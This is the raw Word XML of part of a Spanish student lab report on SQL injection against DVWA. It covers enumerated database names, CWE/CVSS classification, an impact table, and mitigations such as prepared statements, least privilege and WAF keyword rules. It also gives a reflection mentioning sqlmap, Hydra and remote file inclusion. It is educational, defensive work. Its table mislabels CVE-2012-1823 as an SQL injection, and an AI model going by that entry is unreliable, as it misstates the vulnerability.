          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B42D8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[*] dvwa</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E51ACA" w14:textId="6FB6D7EE" w:rsidR="003B42D8" w:rsidRPr="003B42D8" w:rsidRDefault="003B42D8" w:rsidP="003B42D8">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B42D8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Calibri" w:cstheme="minorBidi"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US" w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>[*] information_schema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3341DB8B" w14:textId="20CFD35C" w:rsidR="00AE5F76" w:rsidRDefault="003B42D8">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>8.6</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Clasificación técnica</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3809A8FF" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="009027AF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Referencia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="354F234A" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Detalle</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="3A2C4BD0" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="65A51F2E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE-89</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0AAA1675" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SQL Injection — neutralización impropia de elementos especiales en comandos SQL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="252A05C3" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="50654513" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CWE-209</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="5817D3ED" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Generación de mensajes de error con información sensible (MySQL errors visibles)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="59F24684" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="582BDB70" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CVE-2012-1823</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="258E2A1C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>SQLi crítico en PHP-CGI — ejemplo histórico de impacto masivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="0B84C563" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="3E8827B2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>OWASP Top 10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="0867A72B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>A03:2021 – Injection (posición histórica #1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="2B53073F" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7F95133E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CVSS v4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="15103F24" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>~9.8 Critical — extracción completa de BD + posible RCE via INTO OUTFILE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18CC06F3" w14:textId="77777777" w:rsidR="003B42D8" w:rsidRDefault="003B42D8">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B49B416" w14:textId="76FE6740" w:rsidR="00AE5F76" w:rsidRDefault="003B42D8">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>8.7</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Impacto esperado en un sistema real</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tablaconcuadrcula"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="center"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2877"/>
        <w:gridCol w:w="2876"/>
        <w:gridCol w:w="2877"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AE5F76" w14:paraId="10BFE4E0" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="458E6C4F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dimensión CIA</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="03DDF502" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Impacto</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p w14:paraId="750D0D30" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Justificación</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="1322B396" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2CBC115C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Confidencialidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="45F2C1CD" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CRÍTICO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0D01A4FA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Extracción total de la BD: credenciales, datos personales, PII, información financiera.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="15E9F0FB" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="35502DC7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Integridad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="5FF8EC2E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CRÍTICO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCE8F8"/>
          </w:tcPr>
          <w:p w14:paraId="6B898616" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Modificación o eliminación de registros (UPDATE, DELETE, DROP TABLE).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00AE5F76" w14:paraId="07FC3536" w14:textId="77777777">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4ACE91BE" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Disponibilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="71BA0794" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>ALTO</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08C1A5A4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>DROP DATABASE o SHUTDOWN pueden derribar completamente el sistema.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="719207AB" w14:textId="1B368E31" w:rsidR="00AE5F76" w:rsidRDefault="003B42D8">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
      </w:pPr>
      <w:r>
        <w:t>8.8</w:t>
      </w:r>
      <w:r w:rsidR="009E1026">
        <w:t>. Propuesta de mitigación</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3D2E06" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Prepared Statements / consultas parametrizadas — defensa definitiva:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="681B5C3E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>$stmt = $pdo-&gt;prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="1E1E1E"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:br/>
        <w:t>$stmt-&gt;execute([$id]);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CAE9BF9" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>ORM: frameworks como Eloquent o Doctrine generan queries parametrizadas automáticamente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A29D69" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Deshabilitar mensajes de error detallados en producción (display_errors = Off).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667DAC05" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Principio de mínimo privilegio en BD: el usuario de la app sin permisos DROP, CREATE, FILE.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E3D24B6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>WAF con reglas anti-SQLi: detectar UNION SELECT, OR 1=1, comentarios SQL, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB665B6" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconvietas"/>
      </w:pPr>
      <w:r>
        <w:t>Actualizar funciones deprecadas: migrar de mysql_query() a PDO o MySQLi.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1268B9E2" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="CCCCCC"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>──────────────────────────────────────────────────────────────────────</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AFC082" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7917EA" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Reflexión Personal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539739EF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>A lo largo de este segundo laboratorio, las cuatro vulnerabilidades trabajadas confirman y profundizan el patrón identificado en el Informe #1: la confianza implícita en el input del usuario es la causa raíz de la mayoría de vulnerabilidades críticas en aplicaciones web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B965C10" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="0256D4A4" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Lo que más impresionó durante esta práctica fue la asimetría entre ataque y defensa: sqlmap extrae la base de datos completa en un solo comando que tarda segundos; Hydra encuentra la contraseña de admin en segundos contra un formulario sin protección. Construir esa misma defensa requiere días de trabajo de desarrollo, revisión y prueba.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582850BF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="1DAE9FEF" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>La diferencia entre SQL Injection y SQL Injection Blind fue un aprendizaje importante: la ausencia de mensajes de error no implica ausencia de vulnerabilidad. Un atacante paciente con las herramientas correctas puede extraer cualquier dato bit a bit, incluso cuando la aplicación aparentemente no da información.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3A578F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="0C3DEA96" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>File Inclusion RFI demostró que una sola línea mal configurada en php.ini (allow_url_include = On) puede convertir una funcionalidad de navegación en un vector de ejecución remota de código completa. La seguridad del servidor no depende solo del código de la aplicación, sino también de la configuración del entorno de ejecución.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5D239B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="162BC41B" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:t>Desde la perspectiva profesional, estos laboratorios establecen la base práctica para comprender por qué marcos como OWASP Top 10, controles del NIST CSF y prácticas como SAST/DAST en pipelines de CI/CD son imprescindibles en cualquier ciclo de desarrollo de software seguro. La seguridad no puede ser un parche posterior; debe estar integrada desde el diseño de la arquitectura.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280F0EA3" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="00AE5F76"/>
    <w:p w14:paraId="64B139FC" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0A7047" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Referencias</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71825E08" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>OWASP Foundation. (2021). OWASP Top Ten 2021. https://owasp.org/www-project-top-ten/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315E5E0E" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE Corporation. (2024). CWE-89: SQL Injection. https://cwe.mitre.org/data/definitions/89.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4B1063" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE Corporation. (2024). CWE-78: OS Command Injection. https://cwe.mitre.org/data/definitions/78.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C05C83" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE Corporation. (2024). CWE-22: Path Traversal. https://cwe.mitre.org/data/definitions/22.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA9F06C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>MITRE Corporation. (2024). CWE-307: Improper Restriction of Excessive Authentication Attempts. https://cwe.mitre.org/data/definitions/307.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E79291C" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>FIRST.org. (2023). Common Vulnerability Scoring System v4.0. https://www.first.org/cvss/v4-0/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392B1B1F" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>Stuttard, D., &amp; Pinto, M. (2011). The Web Application Hacker's Handbook (2.a ed.). Wiley.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BC4928" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger. (2024). SQL Injection. https://portswigger.net/web-security/sql-injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="634F55A7" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>PortSwigger. (2024). OS Command Injection. https://portswigger.net/web-security/os-command-injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7595C480" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>Hydra. (2024). THC-Hydra — Fast Network Login Cracker. https://github.com/vanhauser-thc/thc-hydra</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DA064BB" w14:textId="77777777" w:rsidR="00AE5F76" w:rsidRDefault="009E1026">
      <w:pPr>
        <w:pStyle w:val="Listaconnmeros"/>
      </w:pPr>
      <w:r>
        <w:t>sqlmap Project. (2024). sqlmap - Automatic SQL injection tool. https://sqlmap.org/</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00AE5F7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E3511" w14:textId="77777777" w:rsidR="00773144" w:rsidRDefault="00773144">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="241B6E2E" w14:textId="77777777" w:rsidR="00773144" w:rsidRDefault="007731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25455" w14:textId="77777777" w:rsidR="00773144" w:rsidRDefault="00773144">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="345989D8" w14:textId="77777777" w:rsidR="00773144" w:rsidRDefault="007731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aconnmeros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aconnmeros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aconvietas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aconvietas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aconnmeros"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF89"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="7FAC8C6A"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Listaconvietas"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="360"/>
        </w:tabs>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="101C2771"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C9508BF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E0E"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="000B4D96"/>
    <w:rsid w:val="000E2677"/>
    <w:rsid w:val="00121928"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00224957"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002C7998"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003B42D8"/>
    <w:rsid w:val="00431D11"/>
    <w:rsid w:val="004F4753"/>
    <w:rsid w:val="00514FF5"/>
    <w:rsid w:val="0055763B"/>
    <w:rsid w:val="005631F1"/>
    <w:rsid w:val="005D77FE"/>
    <w:rsid w:val="006C4C37"/>
    <w:rsid w:val="00773144"/>
